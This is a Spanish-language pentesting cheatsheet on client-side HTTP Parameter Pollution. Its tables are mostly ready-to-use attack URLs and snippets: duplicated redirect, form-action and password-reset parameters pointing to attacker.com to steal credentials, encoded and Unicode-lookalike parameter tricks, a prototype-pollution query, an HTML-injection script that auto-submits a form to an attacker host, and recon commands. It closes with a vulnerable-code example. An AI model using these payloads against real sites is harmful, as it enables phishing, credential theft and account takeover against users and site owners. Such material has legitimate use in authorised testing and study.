---
aliases:
  - Client-Side HPP
  - DOM HPP
  - URL Manipulation
tags:
  - type/cheatsheet
  - vuln/hpp
  - technique/initial-access
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[HTTP Parameter Pollution]]'
---
# HPP - Client-Side

***

## URL Manipulation en DOM

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Phishing URL: `https://target/?redirect=safe.com&redirect=attacker.com` | Frontend `URLSearchParams.get('redirect')` toma primer (safe), backend procesa último (attacker) | Differential JS vs backend parser. |
| `https://target/page?next=/dashboard&next=//attacker.com` | Open Redirect via DOM HPP | Frontend lee primer, redirige al último. |
| Browser console: `new URLSearchParams('a=1&a=2').get('a')` y `.getAll('a')` | Verificar JS parser behavior | Pre-attack analysis. |
| `https://target/?id=safe&id=<injected_payload>` (XSS via param duplicate) | Frontend lee primer (safe), reflective JS toma último | DOM XSS via HPP. |
| `https://target/oauth/cb?state=valid&state=attacker` | OAuth state confusion en frontend | Federation chain. |
| Inspeccionar JS: `curl -s https://target/main.js \| grep -E 'URLSearchParams\|location\.search'` | Identificar parser usado | Source review. |
| Browser console post-injection: `console.log(new URLSearchParams(location.search).get('a'))` y `getAll('a')` | Verifica behavior live | Validation. |
^hpp-client-url

___

## Form Action / Hidden Field Hijack

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Phishing URL: `https://target/login?action=/login&action=https://attacker.com/phish` | Form action built from URL param → submits a attacker | Form action dinámico. |
| `https://target/?submit_url=safe&submit_url=https://attacker.com/steal` (login form) | Hijack form action → credential theft | High-impact phishing. |
| Inspeccionar HTML: `curl -s https://target/?test=x \| grep -oE '<form[^>]+action[^>]+>'` | Verificar form action reflejado | Pre-attack. |
| `https://target/checkout?continue=safe&continue=https://attacker.com/phish` | Hijack post-checkout redirect | Multi-step form chain. |
| `https://target/reset?next=safe&next=https://attacker.com/fake-reset` | Hijack reset password destination | ATO chain. |
| `<form><input name="x" value="safe"><input name="x" value="evil">` (HTML inject) | Hidden field duplicate via HTML injection | Combo HTMLi + HPP. |
| HTML injection con `<form action="https://attacker.com/" id="f"><script>document.forms.f.submit()</script>` | Override form via injection | XSS-adjacent. |
^hpp-client-form

___

## Encoded Param Confusion

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `https://target/?a=safe&%61=evil` (`%61`=`a`) | Frontend filtra `a`, backend decodifica `%61` como `a` | Decode-after-filter differential. |
| `https://target/?a=safe&%2561=evil` (doble encoded) | Multi-decode chain | Frontend single-decode. |
| `https://target/?a=safe&ａ=evil` (fullwidth Unicode `a`) | Parser que normaliza Unicode | Lookalike normalization. |
| `https://target/?a=safe&A=evil` (case differential) | Case-insensitive backend, case-sensitive frontend | Case differential. |
| `https://target/?Α=safe&А=evil` (Greek `Α` vs Cyrillic `А`) | Visual lookalike Unicode chars | Spoofing combo. |
| `https://target/?a=safe%2526a%253Devil` (mixed encoding) | Multi-decode chain | Decode pipeline. |
| `https://target/?a=safe%26a%3Devil` (encoded `&` y `=`) | Single-value when frontend NO decodifica, backend SÍ | Frontend reads raw, backend decoded. |
| `https://target/?a=safe&%C0%81=evil` (UTF-8 overlong) | Overlong UTF-8 normalization | Edge parser. |
^hpp-client-encoded

___

## JS-Based Parsing Differences

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Browser console: `new URLSearchParams('a=1&a=2').get('a')` → `'1'` | First-wins en URLSearchParams.get() | Standard browser API. |
| Browser console: `new URLSearchParams('a=1&a=2').getAll('a')` → `['1','2']` | Array de todos values | Explicit multi-value. |
| `curl -s https://target/main.js \| grep -E '\\.get\\([\"\x27](\\w+)[\"\x27]\\)'` | Identificar callsites parser | Source review. |
| `curl -s https://target/main.js \| grep -E 'qs\\.parse\|querystring\\.parse'` | Identificar lib parser usado | Stack-aware. |
| `https://target/?__proto__[a]=1` (combo Prototype Pollution) | qs library merge → PP via HPP-style | Stack JS vulnerable. |
| `https://target/?action=update&action=delete` con frontend que reads `action` con `URLSearchParams.get` | First-wins en frontend, backend last-wins | Differential exploitation. |
| Inspeccionar React Router / Vue Router params parsing en source | Per-version behavior | Library-specific. |
| Browser DevTools → Network → ver query params como server interpreta | Compare cliente vs server view | Validation. |
^hpp-client-js

### Workflow client-side HPP

```javascript
// Vulnerable frontend
const params = new URLSearchParams(location.search);
const action = params.get('action');     // first wins
const target = params.get('target');     // first wins

location.href = `https://api.target.com/${action}/${target}`;

// Atacante's URL:
// https://target.com/?action=transfer&action=delete&target=victim&target=attacker
//
// Frontend: action='transfer', target='victim'
// Backend (last-wins): action='delete', target='attacker'
// → desync exploitation
```

***
